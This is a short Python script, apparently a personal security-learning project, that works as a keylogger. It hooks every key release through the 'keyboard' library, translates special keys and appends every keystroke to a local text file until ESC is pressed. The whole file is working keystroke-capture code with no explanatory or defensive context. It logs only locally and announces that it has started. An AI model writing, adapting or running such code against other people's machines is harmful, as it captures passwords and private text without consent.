import keyboard
import os

keyboard_log_path = "D:\python codes\python-security-projects\src\keylogger\keyboard_log.txt"

def new_key(event):
    button = event.name

    # Handle specific key combinations with modifiers
    if keyboard.is_pressed('shift'):
        if button == '2':
            button = '@'
        # Add more shift+symbol mappings here if needed.

    # Handle specific special keys for desired output format
    if button == "space":
        button = " "
    elif button == "enter":
        button = "\n"
    elif button == "esc":
        button = "ESC"
    elif len(button) > 1:
        # Wrap other special keys in brackets for clarity.
        button = f" [{button}] "
    
    with open(keyboard_log_path, "a", encoding="utf-8") as file:
        file.write(button)

keyboard.on_release(callback=new_key)

print("Keylogger started. Press ESC to stop.")
keyboard.wait("esc")
print("Stopped.")